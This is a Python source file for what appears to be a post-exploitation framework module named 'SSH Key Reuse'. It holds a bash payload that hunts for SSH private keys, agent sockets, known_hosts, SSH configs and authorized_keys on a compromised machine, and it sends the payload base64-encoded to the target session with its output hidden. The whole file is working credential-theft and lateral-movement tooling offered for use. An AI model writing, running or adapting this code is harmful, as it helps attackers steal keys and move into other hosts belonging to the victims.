"""SSH key extraction and reuse script."""

from ..base import OperatorScript, ScriptResult


class SSHKeyReuse(OperatorScript):
    """Extract SSH private keys and attempt reuse across hosts."""
    
    name = "SSH Key Reuse"
    description = "Extract SSH private keys and attempt reuse"
    category = "lateral"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] SSH KEY REUSE"
echo "================"
echo ""

echo "[+] Searching for SSH private keys:"
find /home /root -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "id_dsa" 2>/dev/null | while read key; do
    echo "[!] Found private key: $key"
    ls -la "$key"
    
    if [ -r "$key" ]; then
        echo "  [+] Readable!"
        head -1 "$key"
        
        PUB_KEY="${key}.pub"
        if [ -f "$PUB_KEY" ]; then
            echo "  [+] Public key: $PUB_KEY"
            cat "$PUB_KEY"
        fi
        
        ssh-keygen -l -f "$key" 2>/dev/null
    else
        echo "  [-] Not readable"
    fi
    echo ""
done

echo "[+] SSH agent keys (if ssh-agent is running):"
SSH_AUTH_SOCK_LIST=$(find /tmp -name "agent.*" 2>/dev/null)
if [ ! -z "$SSH_AUTH_SOCK_LIST" ]; then
    echo "$SSH_AUTH_SOCK_LIST" | while read sock; do
        echo "[*] Trying agent socket: $sock"
        SSH_AUTH_SOCK=$sock ssh-add -l 2>/dev/null
    done
else
    echo "[-] No SSH agent sockets found"
fi
echo ""

echo "[+] Extracting known_hosts for potential targets:"
find /home /root -name "known_hosts" 2>/dev/null | while read file; do
    echo "[!] $file"
    cat "$file" 2>/dev/null | awk '{print $1}' | tr ',' '\n' | sort -u | head -20
done
echo ""

echo "[+] SSH config host entries:"
find /home /root /etc/ssh -name "config" 2>/dev/null | while read file; do
    echo "[!] $file"
    grep -E "^Host " "$file" 2>/dev/null | awk '{print $2}'
done
echo ""

echo "[+] Authorized keys (who can SSH to this box):"
find /home /root -name "authorized_keys" 2>/dev/null | while read file; do
    echo "[!] $file ($(wc -l < $file) keys)"
    cat "$file" 2>/dev/null | tail -5
done
echo ""

echo "[+] Attempting SSH key reuse on known hosts:"
echo "  [*] This requires extracted private keys and known_hosts"
echo "  [*] Manual step: ssh -i /path/to/key user@target_host"
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Extracting SSH keys for reuse...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="SSH key reuse executed",
                metadata={"script": "ssh_key_reuse"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
